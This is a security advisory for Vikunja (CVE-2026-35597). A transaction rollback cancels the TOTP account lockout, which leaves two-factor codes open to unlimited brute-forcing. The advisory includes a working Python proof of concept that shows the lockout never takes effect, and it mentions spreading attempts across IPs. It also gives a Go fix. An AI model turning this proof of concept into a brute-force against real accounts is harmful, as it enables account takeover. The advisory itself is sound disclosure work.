# [M] Vikunja Vulnerable to TOTP Brute-Force Due to Non-Functional Account Lockout

## Summary
Severity: Medium
Advisory: GHSA-fgfv-pv97-6cmj
CVE: CVE-2026-35597
CWE: CWE-307
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-fgfv-pv97-6cmj
Type: github-advisory

## Affected
- Go: `code.vikunja.io/api` — affected >=0 <2.3.0

## Details
## Summary

The TOTP failed-attempt lockout mechanism is non-functional due to a database transaction handling bug. The account lock is written to the same database session that the login handler always rolls back on TOTP failure, so the lockout is triggered but never persisted. This allows unlimited brute-force attempts against TOTP codes.

## Details

When a TOTP validation fails, the login handler at `pkg/routes/api/v1/login.go:95-101` calls `HandleFailedTOTPAuth` and then unconditionally rolls back:

```go
if err != nil {
    if user2.IsErrInvalidTOTPPasscode(err) {
        user2.HandleFailedTOTPAuth(s, user)
    }
    _ = s.Rollback()
    return err
}
```

`HandleFailedTOTPAuth` at `pkg/user/totp.go:201-247` uses an in-memory counter (key-value store) to track failed attempts. When the counter reaches 10, it calls `user.SetStatus(s, StatusAccountLocked)` on the same database session `s`. Because the login handler always rolls back after a TOTP failure, the `StatusAccountLocked` write is undone.

The in-memory counter correctly increments past 10, so the lockout code executes on every subsequent attempt, but the database write is rolled back every time.

## Proof of Concept

Tested on Vikunja v2.2.2. Requires `pyotp` (`pip install pyotp`).

```python
import requests, time, pyotp

TARGET = "http://localhost:3456"
API = f"{TARGET}/api/v1"

def h(token):
    return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

# setup: login, enroll and enable TOTP
token = requests.post(f"{API}/login",
    json={"username": "totp_user", "password": "TotpUser1!"}).json()["token"]
secret = requests.post(f"{API}/user/settings/totp/enroll", headers=h(token)).json()["secret"]
totp = pyotp.TOTP(secret)
requests.post(f"{API}/user/settings/totp/enable", headers=h(token),
              json={"passcode": totp.now()})

# send 9 failed attempts (rate limit is 10/min)
for i in range(1, 10):
    r = requests.post(f"{API}/login",
        json={"username": "totp_user", "password": "TotpUser1!", "totp_passcode": "000000"})
    print(f"Attempt {i}: {r.status_code} code={r.json().get('code')}")

# wait for rate limit reset, send 3 more (past the 10-attempt lockout threshold)
time.sleep(65)
for i in range(10, 13):
    r = requests.post(f"{API}/login",
        json={"username": "totp_user", "password": "TotpUser1!", "totp_passcode": "000000"})
    print(f"Attempt {i}: {r.status_code} code={r.json().get('code')}")

# wait for rate limit, try with valid TOTP
time.sleep(65)
r = requests.post(f"{API}/login",
    json={"username": "totp_user", "password": "TotpUser1!", "totp_passcode": totp.now()})
print(f"Valid TOTP login: {r.status_code}")  # 200 - account was never locked
```

Output:
```
Attempt 1: 412 code=1017
...
Attempt 9: 412 code=1017
Attempt 10: 412 code=1017
Attempt 11: 412 code=1017
Attempt 12: 412 code=1017
Valid TOTP login: 200
```

The account was never locked despite exceeding the 10-attempt threshold. The per-IP rate limit of 10 requests/minute requires spacing attempts, but an attacker with multiple source IPs can parallelize.

## Impact

An attacker who has obtained a user's password (via phishing, credential stuffing, or database breach) can bypass TOTP two-factor authentication by brute-forcing 6-digit codes. The intended account lockout after 10 failed attempts never takes effect. While per-IP rate limiting provides friction, a distributed attacker can exhaust the TOTP code space.

## Recommended Fix

Have `HandleFailedTOTPAuth` create and commit its own independent database session for the lockout operation:

```go
// Use a new session so the lockout persists regardless of caller's rollback
lockoutSession := db.NewSession()
defer lockoutSession.Close()
err = user.SetStatus(lockoutSession, StatusAccountLocked)
if err != nil {
    _ = lockoutSession.Rollback()
    return
}
_ = lockoutSession.Commit()
```

---
*Found and reported by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/go-vikunja/vikunja/security/advisories/GHSA-fgfv-pv97-6cmj
- https://nvd.nist.gov/vuln/detail/CVE-2026-35597
- https://github.com/go-vikunja/vikunja/pull/2576
- https://github.com/go-vikunja/vikunja/commit/6ca0151d02fa0e8c7e2181ab916a28e08caaaec8
- https://github.com/go-vikunja/vikunja
- https://github.com/go-vikunja/vikunja/releases/tag/v2.3.0
